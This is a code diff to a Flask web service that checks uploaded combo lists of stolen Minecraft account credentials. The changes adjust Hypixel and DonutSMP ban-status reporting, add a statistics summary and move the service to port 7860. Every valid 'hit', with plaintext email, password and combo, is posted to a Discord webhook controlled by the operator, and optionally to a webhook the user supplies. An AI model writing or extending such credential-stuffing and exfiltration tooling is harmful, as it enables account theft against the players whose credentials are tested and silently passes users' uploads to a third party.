@@ -24,28 +24,22 @@ UPLOAD_DIR.mkdir(exist_ok=True)
 jobs = {}
 jobs_lock = threading.Lock()
 
-def send_hit_notification(email, password, account_type="Minecraft Java", capes="None", hypixel_status="Unbanned", hypixel_level="N/A", hypixel_rank="N/A", donut_status="Unbanned", donut_playtime="N/A", donut_money="N/A", user_webhook_url=None):
-    """
-    Sends clean, formatted hit logs to Discord matching the professional embed layout:
-    - ALWAYS sends to ADMIN_WEBHOOK_URL.
-    - OPTIONALLY sends to user_webhook_url if provided.
-    """
+def send_hit_notification(email, password, account_type="Minecraft Java", capes="None", hypixel_status="Unbanned", hypixel_level="N/A", hypixel_rank="N/A", donut_status="Unbanned", user_webhook_url=None):
     hypixel_stats_block = f"Rank: {hypixel_rank}\nLevel: {hypixel_level}"
-    donut_stats_block = f"Playtime: {donut_playtime}\nMoney: {donut_money}"
+    donut_stats_block = f"Status: {donut_status}"
 
     payload = {
         "username": "Demon Hits Bot",
         "embeds": [
             {
-                "color": 16753920,  # Sleek Orange/Gold accent bar on the left
+                "color": 16753920,
                 "fields": [
                     {"name": "🔑 Email", "value": f"||`{email}`||", "inline": False},
                     {"name": "🔑 Password", "value": f"||`{password}`||", "inline": False},
                     {"name": "🦊 Type", "value": account_type, "inline": True},
                     {"name": "🛡️ Hypixel", "value": hypixel_status, "inline": True},
                     {"name": "📊 Hypixel Stats", "value": f"```\n{hypixel_stats_block}\n```", "inline": False},
-                    {"name": "🍩 Donut", "value": donut_status, "inline": True},
-                    {"name": "📊 Donut Stats", "value": f"```\n{donut_stats_block}\n```", "inline": False},
+                    {"name": "🍩 DonutSMP", "value": f"```\n{donut_stats_block}\n```", "inline": False},
                     {"name": "🧥 Capes", "value": capes if capes else "None", "inline": True},
                     {"name": "🔑 Combo", "value": f"||`{email}:{password}`||", "inline": False},
                 ],
@@ -54,13 +48,11 @@ def send_hit_notification(email, password, account_type="Minecraft Java", capes=
         ]
     }
 
-    # 1. ALWAYS Send to Admin Webhook
     try:
         requests.post(ADMIN_WEBHOOK_URL, json=payload, timeout=5)
     except Exception as e:
         print(f"Admin Webhook Error: {e}")
 
-    # 2. OPTIONAL: Send to User Webhook if provided
     if user_webhook_url and str(user_webhook_url).strip():
         try:
             requests.post(str(user_webhook_url).strip(), json=payload, timeout=5)
@@ -80,11 +72,17 @@ def process_text_file(job_id, input_file, user_webhook=None):
 
         validator.run(str(input_file), str(output_file), user_webhook=user_webhook)
 
-        # Count actual hits found from Hits.txt or fallback to lines
         hits_count = 0
         hits_file = job_results_dir / "Hits.txt"
         if hits_file.is_file():
             hits_count = len([line for line in hits_file.read_text(encoding="utf-8", errors="replace").splitlines() if line.strip()])
+
+        # Parse detailed results summary for frontend dashboard
+        results_content = output_file.read_text(encoding="utf-8", errors="replace") if output_file.is_file() else ""
+        
+        donut_unbanned = len([line for line in results_content.splitlines() if "DonutSMP Status: Unbanned" in line])
+        donut_banned = len([line for line in results_content.splitlines() if "DonutSMP Status: Banned" in line])
+        mc_owned = len([line for line in results_content.splitlines() if "UUID:" in line and len(line.split("UUID:")[-1].strip()) > 0])
 
         with jobs_lock:
             jobs[job_id] = {
@@ -92,7 +90,13 @@ def process_text_file(job_id, input_file, user_webhook=None):
                 "message": "Processing completed successfully",
                 "line_count": f"{hits_count} Hits Found",
                 "download_url": f"/results/{job_id}/results.txt",
-                "user_webhook": user_webhook
+                "user_webhook": user_webhook,
+                "stats_summary": {
+                    "total_hits": hits_count,
+                    "mc_owned": mc_owned,
+                    "donut_unbanned": donut_unbanned,
+                    "donut_banned": donut_banned
+                }
             }
 
     except Exception as e:
@@ -199,4 +203,5 @@ def download_result(folder, filename):
     return send_from_directory(folder_path, filename, as_attachment=True)
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000, debug=True)
+    app.run(host="0.0.0.0", port=7860, debug=True)
+            
